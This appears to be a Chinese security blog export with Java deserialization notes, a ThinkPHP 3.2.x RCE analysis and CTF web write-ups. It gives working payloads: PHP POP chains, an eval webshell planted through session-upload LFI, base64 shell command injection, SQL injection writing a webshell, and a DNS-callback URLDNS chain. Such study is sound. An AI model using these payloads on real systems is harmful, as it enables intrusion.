\u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; instance from a stream (that is, * deserialize it). */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); arr = new Object[30]; // Read in all elements in the proper order. for (int i = 0; i \u0026lt; 30; i++) { arr[i] = s.readObject(); } } } 安全问题的产生 只要服务端反序列化数据，客户端传递的类的readObject中的代码就会自动执行，给予攻击者在服务器上运行代码的能力。\n可能的形式 入口类的readObject直接调用危险方法。 入口类参数中包含可控类，该类有危险方法，readObject时调用。 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。 构造函数/静态代码块等在类加载时隐式执行 利用 入口类 重写readObject readObject调用常见函数 参数类型宽泛 最好jdk自带 调用链 gadget chain 相同名称，相同类型 执行类 URLDNS 最简单的链，检测反序列化位点\n1 2 3 4 5 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 然而put的时候直接调用了hashCode，需要通过反射改变已有对象的属性。\n注意，java有dns缓存，所以同一个url，只会dns解析一次，后面都会直接在缓存里面找\n拓展 Serializable 接口\n一个对象想要被序列化，那么它的类就要实现此接口或者它的子接口。\n这个对象的所有属性（包括private属性、包括其引用的对象）都可以被序列化和反序列化来保存、传递。不想序列化的字段可以使用transient修饰。\n由于Serializable对象完全以它存储的二进制位为基础来构造，因此并不会调用任何构造函数，因此Serializable类无需默认构造函数，但是当Serializable类的父类没有实现Serializable接口时，反序列化过程会调用父类的默认构造函数，因此该父类必需有默认构造函数，否则会抛异常。\n使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。\nExternalizable 接口\n它是Serializable接口的子类，用户要实现的writeExternal()和readExternal() 方法，用来决定如何序列化和反序列化。\n因为序列化和反序列化方法需要自己实现，因此可以指定序列化哪些属性，而transient在这里无效。\n对Externalizable对象反序列化时，会先调用类的无参构造方法，这是有别于默认反序列方式的。如果把类的不带参数的构造方法删除，或者把该构造方法的访问权限设置为private、默认或protected级别，会抛出java.io.InvalidException: no valid constructor异常，因此Externalizable对象必须有默认构造函数，而且必需是public的。\n反射 Java 的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。\n总的来时，反射赋予Java动态特性\n反射的基本使用 获取Class对象 使用Class.forName 静态方法\n1 Class class1 = Class.forName(\u0026#34;Person\u0026#34;); 使用类的.class静态属性\n1 Class class2 = Person.class; 使用实例对象的getClass()方法\n1 2 Person person = new Person(); Class class3 = person.getClass(); 通过ClassLoader获取\n1 2 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); Class\u0026lt;?\u0026gt; c = systemClassLoader.loadClass(\u0026#34;Person\u0026#34;); 创造实例对象 通过Class的newInstance()方法 通过Constructor的newInstance()方法 1 2 3 4 5 6 7 8 9 //方式一 Class class1 = Class.forName(\u0026#34;reflection.Student\u0026#34;); Student student = (Student) class1.newInstance(); System.out.println(student); //方式二 Constructor constructor = class1.getConstructor(); Student student1 = (Student) constructor.newInstance(); System.out.println(student1); 方法一只能调用无参构造函数，一般不用\n获取类的成员变量 1 2 3 4 getField() getDeclaredField() getFields() getDeclaredFields() 修改成员变量 1 Field.set(Object obj,Object value) 如何修改私有变量？\n1 Field.setAccessible(true); 获取类的方法 1 2 3 4 getMethod(String name, Class\u0026lt;?\u0026gt;... parameterTypes) getMethods() getDeclaredMethod() getDeclaredMethods() 调用类的方法 1 invoke(Object obj, Object... args) setAccessible同理\n回到URLDNS put之前修改hashCode属性不为-1；put之后，反序列化之前修改hashCode属性为-1\n1 2 3 4 5 6 7 8 9 HashMap\u0026lt;URL,Integer\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); URL url = new URL(\u0026#34;http://y21jgo6y2e6rmwv062dgrkf2ctik69.burpcollaborator.net\u0026#34;); Class c = url.getClass(); Field hashCodeField = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashCodeField.setAccessible(true); hashCodeField.set(url,123); hashMap.put(url,1); hashCodeField.set(url,-1); serialize(hashMap); 应用 定制需要的对象 通过invoke调用除了同名函数之外的函数 通过Class类创建对象，引入不能序列化的类 类的动态加载 类的加载机制 Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这个过程被称作虚拟机的类加载机制。\n类的生命周期 类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载，验证，准备，解析，初始化,使用,卸载这7个阶段.其中其中验证、准备、解析3个部分统称为连接\n加载：查找并加载类的二进制数据 验证：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转换为直接引用 初始化：对类的静态变量，静态代码块执行初始化操作 使用：类访问方法区内的数据结构的接口， 对象是Heap区的数据。 卸载 类加载器 虚拟机设计团队把类加载阶段中的“通过一个类的全限定名来获取描述此类的二进制字节流”这个动作放到Java虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。 实现这个动作的代码模块称为“类加载器”。\n类加载的三种方式 命令行启动应用时候由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载 .class和getClass()使用之前类均已加载完毕\n类加载机制 类的双亲委派机制\n双亲委派模型的工作过程是：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。\n启动类加载器(Bootstrap ClassLoader) 这个类将器负责将存放在＜JAVA_HOME＞\\lib目录中的，或者被-Xbootclasspath参数所指定的路径中的，并且是虚拟机识别的（按照文件名识别，如rt.jar、tools.jar，名字不符合的类库即使放在lib目录中也不会被加载）类库加载到虚拟机内存中。\n扩展类加载器(Extension ClassLoader) 这个加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载＜JAVA_HOME＞\\lib\\ext目录中的，或者被java.ext.dirs系统变量所指定的路径中的所有类库，开发者可以直接使用扩展类加载器。\n应用程序类加载器(Application ClassLoader) 这个类加载器由sun.misc.Launcher$AppClassLoader来实现。由于应用程序类加载器是ClassLoader类中的getSystem-ClassLoader()方法的返回值，所以有些场合中也称它为“系统类加载器”。\n它负责加载用户类路径（ClassPath）上所有的类库，开发者同样可以直接在代码中使用这个类加载器。如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。\n我们的应用程序都是由这3种类加载器互相配合进行加载的，如果有必要，还可以加入自己定义的类加载器。\n举例如下： 当AppClassLoader加载一个class时，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器ExtClassLoader去完成。 当ExtClassLoader加载一个class时，它首先也不会自己去尝试加载这个类，而是把类加载请求委派给BootStrapClassLoader去完成。 如果BootStrapClassLoader加载失败(例如在$JAVA_HOME/jre/lib里未查找到该class)，会使用ExtClassLoader来尝试加载； 若ExtClassLoader也加载失败，则会使用AppClassLoader来加载，如果AppClassLoader也加载失败，则会报出异常ClassNotFoundException。 类加载与代码执行 JVM初始化加载 初始化：静态代码块\n实例化：构造代码块、无参构造函数\n动态加载 Class.forname：初始化/不初始化皆可\nClassLoader.loadClass：不进行初始化\n加载任意类 加载自己的恶意类，拓展攻击面\n分析 1 2 继承关系： ClassLoader-\u0026gt;SecureClassLoader-\u0026gt;URLClassLoader-\u0026gt;AppClassLoader 1 2 调用链： loadClass-\u0026gt;findClass-\u0026gt;defineClass 利用 URLClassLoader任意类加载:file/http/jar\n1 2 3 4 5 // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file:///C:\\\\tmp\\\\\u0026#34;)}); // URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://localhost:8888/\u0026#34;)}); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;jar:file:///C:\\\\tmp\\\\Hello.jar!/\u0026#34;)}); Class\u0026lt;?\u0026gt; c1 = urlClassLoader.loadClass(\u0026#34;Hello\u0026#34;); c1.newInstance(); ClassLoader.defineClass 字节码加载任意类\n1 2 3 4 Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(\u0026#34;C:\\\\tmp\\\\Hello.class\u0026#34;)); defineClassMethod.invoke(systemClassLoader,\u0026#34;Hello\u0026#34;,code,0,code.length); maven踩坑 中文官网下载jdk的链接有问题，需要去英文官网才正常 只有使用idea自带的maven才可以download source，否则会报错：Sources not found for: commons-collections:commons-collections:3.2.1 参考 白日梦组长的个人空间_哔哩哔哩_bilibili\n(2条消息) java序列化与反序列化全讲解_mocas_wang的博客-CSDN博客_java序列化讲解\n谈谈Java反射：从入门到实践，再到原理 - 掘金 (juejin.cn)\n关于JVM类加载机制，看这一篇就够了 - 掘金 (juejin.cn)\n","date":"2021-12-12T15:53:17+08:00","permalink":"https://k1te.cn/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/","title":"Java反序列化基础"},{"content":"躺了\nWebFTP 根据指纹找到了github上的源码：wifeat/WebFTP\n默认的密码admin888无法登录，账户信息存在Data/User/md5(username).php中，从代码逻辑上看不出什么漏洞\n发现Readme目录下有一个php探针，刚开始进去四处点 点不出东西，然后看了下源码发现提交act参数即可拿到phpinfo，然后flag在phpinfo里边\npayload：/Readme/mytz.php?act=phpinfo\npklovecloud (不是很懂题目“pklovecloud”是啥意思。。。\n直接给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; class pkshow { function echo_name() { return \u0026#34;Pk very safe^.^\u0026#34;; } } class acp { protected $cinder; public $neutron; public $nova; function __construct() { $this-\u0026gt;cinder = new pkshow; } function __toString() { if (isset($this-\u0026gt;cinder)) return $this-\u0026gt;cinder-\u0026gt;echo_name(); } } class ace { public $filename; public $openstack; public $docker; function echo_name() { $this-\u0026gt;openstack = unserialize($this-\u0026gt;docker); $this-\u0026gt;openstack-\u0026gt;neutron = $heat; if($this-\u0026gt;openstack-\u0026gt;neutron === $this-\u0026gt;openstack-\u0026gt;nova) { $file = \u0026#34;./{$this-\u0026gt;filename}\u0026#34;; if (file_get_contents($file)) { return file_get_contents($file); } else { return \u0026#34;keystone lost~\u0026#34;; } } } } if (isset($_GET[\u0026#39;pks\u0026#39;])) { $logData = unserialize($_GET[\u0026#39;pks\u0026#39;]); echo $logData; } else { highlight_file(__file__); } ?\u0026gt; 这里主要是有个未知的$heat变量，但是没有使用global关键字的话是取不到开头include到本文件中的变量，所以应该是null，我们直接置空即可\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; class acp { protected $cinder; public $neutron ; public $nova ; function __construct($cinder) { $this-\u0026gt;cinder = $cinder; } } class ace { public $filename = \u0026#34;flag.php\u0026#34;; public $openstack; public $docker; function __construct($docker) { $this-\u0026gt;docker = $docker; } } $cp = new acp(\u0026#34;123\u0026#34;); $ce = new ace(serialize($cp)); echo urlencode(serialize(new acp($ce))); ?\u0026gt; payload:O%3A3%3A\u0026quot;acp\u0026quot;%3A3%3A%7Bs%3A9%3A\u0026quot;%00%2A%00cinder\u0026quot;%3BO%3A3%3A\u0026quot;ace\u0026quot;%3A3%3A%7Bs%3A8%3A\u0026quot;filename\u0026quot;%3Bs%3A8%3A\u0026quot;flag.php\u0026quot;%3Bs%3A9%3A\u0026quot;openstack\u0026quot;%3BN%3Bs%3A6%3A\u0026quot;docker\u0026quot;%3Bs%3A69%3A\u0026quot;O%3A3%3A\u0026quot;acp\u0026quot;%3A3%3A%7Bs%3A9%3A\u0026quot;%00%2A%00cinder\u0026quot;%3Bs%3A3%3A\u0026quot;123\u0026quot;%3Bs%3A7%3A\u0026quot;neutron\u0026quot;%3BN%3Bs%3A4%3A\u0026quot;nova\u0026quot;%3BN%3B%7D\u0026quot;%3B%7Ds%3A7%3A\u0026quot;neutron\u0026quot;%3BN%3Bs%3A4%3A\u0026quot;nova\u0026quot;%3BN%3B%7D\nEasyCleanup 题目好像下午的时候被搅屎了，还导致比赛被迫暂停（xs\n直接给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php if(!isset($_GET[\u0026#39;mode\u0026#39;])){ highlight_file(__file__); }else if($_GET[\u0026#39;mode\u0026#39;] == \u0026#34;eval\u0026#34;){ $shell = $_GET[\u0026#39;shell\u0026#39;] ?? \u0026#39;phpinfo();\u0026#39;; if(strlen($shell) \u0026gt; 15 | filter($shell) | checkNums($shell)) exit(\u0026#34;hacker\u0026#34;); eval($shell); } if(isset($_GET[\u0026#39;file\u0026#39;])){ if(strlen($_GET[\u0026#39;file\u0026#39;]) \u0026gt; 15 | filter($_GET[\u0026#39;file\u0026#39;])) exit(\u0026#34;hacker\u0026#34;); include $_GET[\u0026#39;file\u0026#39;]; } function filter($var): bool{ $banned = [\u0026#34;while\u0026#34;, \u0026#34;for\u0026#34;, \u0026#34;\\$_\u0026#34;, \u0026#34;include\u0026#34;, \u0026#34;env\u0026#34;, \u0026#34;require\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;`\u0026#34;]; foreach($banned as $ban){ if(strstr($var, $ban)) return True; } return False; } function checkNums($var): bool{ $alphanum = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $cnt = 0; for($i = 0; $i \u0026lt; strlen($alphanum); $i++){ for($j = 0; $j \u0026lt; strlen($var); $j++){ if($var[$j] == $alphanum[$i]){ $cnt += 1; if($cnt \u0026gt; 8) return True; } } } return False; } ?\u0026gt; 查看phpinfo发现session.upload_progress.cleanup参数是Off且session.save_path参数为空，参考：session.upload_progress+LFI实现RCE - ca01h\u0026rsquo;s Blog，还不需要条件竞争。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 POST / HTTP/1.1 Host: 114.115.134.72:32770 Content-Length: 3144 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjyLGZ6hpSLAUXQv6 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=Kk Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6 Content-Disposition: form-data; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; \u0026lt;?php @eval($_POST[k1te]);?\u0026gt; ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;untitled.php\u0026#34; Content-Type: application/octet-stream \u0026lt;?php class ------WebKitFormBoundaryjyLGZ6hpSLAUXQv6-- 然后直接访问/?file=/tmp/sess_Kk即可\nPNG图片转换器 附件给了app.rb：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 require \u0026#39;sinatra\u0026#39; require \u0026#39;digest\u0026#39; require \u0026#39;base64\u0026#39; get \u0026#39;/\u0026#39; do open(\u0026#34;./view/index.html\u0026#34;, \u0026#39;r\u0026#39;).read() end get \u0026#39;/upload\u0026#39; do open(\u0026#34;./view/upload.html\u0026#34;, \u0026#39;r\u0026#39;).read() end post \u0026#39;/upload\u0026#39; do unless params[:file] \u0026amp;\u0026amp; params[:file][:tempfile] \u0026amp;\u0026amp; params[:file][:filename] \u0026amp;\u0026amp; params[:file][:filename].split(\u0026#39;.\u0026#39;)[-1] == \u0026#39;png\u0026#39; return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;error\u0026#39;);location.href=\u0026#39;/upload\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; end begin filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + \u0026#39;.png\u0026#39; open(filename, \u0026#39;wb\u0026#39;) { |f| f.write open(params[:file][:tempfile],\u0026#39;r\u0026#39;).read() } \u0026#34;Upload success, file stored at #{filename}\u0026#34; rescue \u0026#39;something wrong\u0026#39; end end get \u0026#39;/convert\u0026#39; do open(\u0026#34;./view/convert.html\u0026#34;, \u0026#39;r\u0026#39;).read() end post \u0026#39;/convert\u0026#39; do begin unless params[\u0026#39;file\u0026#39;] return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;error\u0026#39;);location.href=\u0026#39;/convert\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; end file = params[\u0026#39;file\u0026#39;] unless file.index(\u0026#39;..\u0026#39;) == nil \u0026amp;\u0026amp; file.index(\u0026#39;/\u0026#39;) == nil \u0026amp;\u0026amp; file =~ /^(.+)\\.png$/ return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;dont hack me\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34; end res = open(file, \u0026#39;r\u0026#39;).read() headers \u0026#39;Content-Type\u0026#39; =\u0026gt; \u0026#34;text/html; charset=utf-8\u0026#34; \u0026#34;var img = document.createElement(\\\u0026#34;img\\\u0026#34;);\\nimg.src= \\\u0026#34;data:image/png;base64,\u0026#34; + Base64.encode64(res).gsub(/\\s*/, \u0026#39;\u0026#39;) + \u0026#34;\\\u0026#34;;\\n\u0026#34; rescue \u0026#39;something wrong\u0026#39; end end 参考：Ruby的 open 函数导致命令执行 | Yukang\u0026rsquo;s Page，有ping命令注入内味儿了，因为过滤了..和/，所以可以用编码绕过\npayload：\n1 2 3 4 //ls / file=|echo bHMgLw==|base64 -d|bash||1.png //cat /FLA9_wmXLXmOWKLLQkpP0ceIy file=|echo Y2F0IC9GTEE5X3dtWExYbU9XS0xMUWtwUDBjZUl5|base64 -d|bash||1.png yet_another_mysql_injection 根据hint拿到源码/?source：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php include_once(\u0026#34;lib.php\u0026#34;); function alertMes($mes,$url){ die(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;{$mes}\u0026#39;);location.href=\u0026#39;{$url}\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;); } function checkSql($s) { if(preg_match(\u0026#34;/regexp|between|in|flag|=|\u0026gt;|\u0026lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|\u0026amp;|;|\\\\\\$|0x|sleep|\\ /i\u0026#34;,$s)){ alertMes(\u0026#39;hacker\u0026#39;, \u0026#39;index.php\u0026#39;); } } if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;] != \u0026#39;\u0026#39;) { $username=$_POST[\u0026#39;username\u0026#39;]; $password=$_POST[\u0026#39;password\u0026#39;]; if ($username !== \u0026#39;admin\u0026#39;) { alertMes(\u0026#39;only admin can login\u0026#39;, \u0026#39;index.php\u0026#39;); } checkSql($password); $sql=\u0026#34;SELECT password FROM users WHERE username=\u0026#39;admin\u0026#39; and password=\u0026#39;$password\u0026#39;;\u0026#34;; $user_result=mysqli_query($con,$sql); $row = mysqli_fetch_array($user_result); if (!$row) { alertMes(\u0026#34;something wrong\u0026#34;,\u0026#39;index.php\u0026#39;); } if ($row[\u0026#39;password\u0026#39;] === $password) { die($FLAG); } else { alertMes(\u0026#34;wrong password\u0026#34;,\u0026#39;index.php\u0026#39;); } } if(isset($_GET[\u0026#39;source\u0026#39;])){ show_source(__FILE__); die; } ?\u0026gt; 最后注出来发现库里面没东西，需要利用trick使得输入和输出相等，这里直接拿队友的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 def quine(data, debug=True): if debug: print(data) data = data.replace(\u0026#39;YY\u0026#39;,\u0026#34;REPLACE(REPLACE(YY,CHAR(34),CHAR(39)),CHAR(89),YY)\u0026#34;) blob = data.replace(\u0026#39;YY\u0026#39;,\u0026#39;\u0026#34;Y\u0026#34;\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;) data = data.replace(\u0026#39;YY\u0026#39;,\u0026#34;\u0026#39;\u0026#34;+blob+\u0026#34;\u0026#39;\u0026#34;) if debug: print(data) return data data = quine(\u0026#34;\u0026#39;UNION/**/SELECT/**/YY/**/AS/**/ZZ#\u0026#34;) print(data) #改了下脚本 #https://www.shysecurity.com/post/20140705-SQLi-Quine #看上面这篇文章 payload:'UNION/**/SELECT/**/REPLACE(REPLACE('\u0026quot;UNION/**/SELECT/**/REPLACE(REPLACE(\u0026quot;Y\u0026quot;,CHAR(34),CHAR(39)),CHAR(89),\u0026quot;Y\u0026quot;)/**/AS/**/ZZ#',CHAR(34),CHAR(39)),CHAR(89),'\u0026quot;UNION/**/SELECT/**/REPLACE(REPLACE(\u0026quot;Y\u0026quot;,CHAR(34),CHAR(39)),CHAR(89),\u0026quot;Y\u0026quot;)/**/AS/**/ZZ#')/**/AS/**/ZZ#\n","date":"2021-09-16T19:47:24+08:00","permalink":"https://k1te.cn/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/","title":"2021第五空间线上web"},{"content":"前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。\n利用 这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接\n利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：\n1 2 3 4 public function index($value=\u0026#39;\u0026#39;){ $this-\u0026gt;assign($value); $this-\u0026gt;display(); } payload：?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=.\\Application\\Runtime\\Logs\\Home\\21_06_30.log\n本质上是一个文件包含，再结合报错写log最终达到rce的目的\n分析 这里我们先不包含log，而是包含config.ini来分析文件包含，payload：\n1 ?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=C://config.ini 首先我们的可控参数通过Controller.class.php中的assign函数最终跳到了View.class.php中的assign函数： 在该函数中将其赋值给$this-\u0026gt;tVar变量：\n赋值结束后回到IndexController再进入到display函数，和上面的assign函数一样最终跳到View.class.php的display函数中，该函数中的fetch函数解析并获取模板文件内容，此时模板文件路径和内容为空：\n继续跟进fetch函数，该函数中将空的templateFile传入parseTemplate函数:\n当参数为空时，parseTemplate函数返回默认的模板文件位置./Application/Home/View/Index/index.html\n接着往下走，系统配置的默认模板引擎为think，所以程序进入else分支\n将this-\u0026gt;tVar放入params变量中跳入Hook::listen，tag变量是写死的view_parse，因此name变量为Behavior\\ParseTemplateBehavior，接着进入self::exec\n在exec函数中调用Behavior\\ParseTemplateBehavior的run方法处理带有我们可控参数的$params变量：\n在run方法中经过一些判断，最终调用fetch函数编译并加载模板文件，此时第二个参数就是我们的可控参数：array(\u0026quot;_filename\u0026quot;=\u0026gt;\u0026ldquo;C://config.ini\u0026rdquo;);\n继续跟进fetch，获取缓存文件路径后，进入Storage的load方法中：\n在load方法中，$_filename为之前获取的缓存文件路径，$var则为之前带有_filename=C://config.ini的数组，利用extract方法进行变量覆盖，实现任意文件包含：\n众所周知，include函数不在意包含的什么文件：\n因此我们可以构造一个不存在的模块，使得tp报错，此时tp会将url写入log中，所以我们可以在url中写入恶意代码，再结合上面的LFI实现任意代码执行。\n","date":"2021-08-14T16:19:19+08:00","permalink":"https://k1te.cn/p/tp3.2.xrce/","title":"TP3.2.xRCE"},{"content":"emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般\nWeb ezrce 参考：Yapi远程命令执行漏洞复现 - FreeBuf网络安全行业门户，直接打就行\ncat flag 直接给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt; cmd参数不能包含flag关键词，然后经过escapeshellarg函数之后执行cat命令。\n有个hint：管理员曾访问过flag。\n经过一番查找，找到了nignx的access.log，payload:/?cmd=/var/log/nginx/access.log，可以看到有一个/this_is_final_flag_e2a457126032b42d.php，应该就是要cat这个文件了，但是文件名里包含了flag关键词，而且又经过了escapeshellarg函数，没法命令注入\n找了蛮久的，最后在文档里找到这么一个评论\n意思大概是escapeshellarg会在没有设置lang环境变量的时候将非ASCII字符丢弃，所以我们可以使用非ASCII字符绕过，最终payload：/?cmd=this_is_final_fl%ffag_e2a457126032b42d.php\n其实早上的时候就看到了相关的文章：\n但是当时尝试的是ā这个字符，不知道为啥不行\neasythinkphp 一个thinkphp3.2.3比较新的洞，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报 (qq.com)\n最终payload：/?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=../../../flag\njspxcms 参考：复现jspxcms解压getshell漏洞 | lockcy\u0026rsquo;s cave\n需要管理员的权限，比赛的时候是公用靶机，每十分钟重置一次，刚开始的时候进不了后台找不到点，后面就盯着重置然后冲进去改密码hh\n需要用到冰蝎，冰蝎的坑具体参考：为啥子java14还是运行不了 · Issue #115 · rebeyond/Behinder (github.com)\n最后：\ncybercms www.zip有源码\n根据源码的信息确定是BEESCMS，网上寻找相关漏洞利用，大概找到这么几篇吧：\n【代码审计初探】beescms v4.0_R SQL_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)\n【代码审计】对Beescms SQL注入漏洞的进一步思考_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)\n【送0day】代码审计就该这么来3 beescms getshell_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)\nsession覆盖可以进入后台，但是上传的时候显示permission deny，于是转向sql注入。\n与源码对比发现出题人增加了一个过滤函数，并且把报错关了（没找到报错在哪关了。。）：\n可以看到这个过滤还是很好绕的，上面的用双写绕过，下面的用/**/绕过即可\n实际测试发现经过htmlspecialchars的字符可以注入到sql语句，但是没法正常放进数据库里（tcl，不知道为啥）\n最终payload：user=admin%27/**/un+union+ion/**/selselectect/**/null,null,null,null,0x3c3f70687020686967686c696768745f66696c65285f5f46494c455f5f293b406576616c28245f504f53545b6b3174655d293b3f3e/**/into/**/outoutfilefile/**/%27/var/www/html/shell.php%27%23\n效果：\nez_website 参考：齐博建站系统x1.0代码审计 - Ma4ter Blog\nlabelmodels控制器get_label方法直接将tag_arrar数组键cfg的值进行了反序列化：\n直接拿tp5的pop链打就行，网上找了个exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 \u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类 } } } namespace think { abstract class Model{ protected $append = []; protected $error = 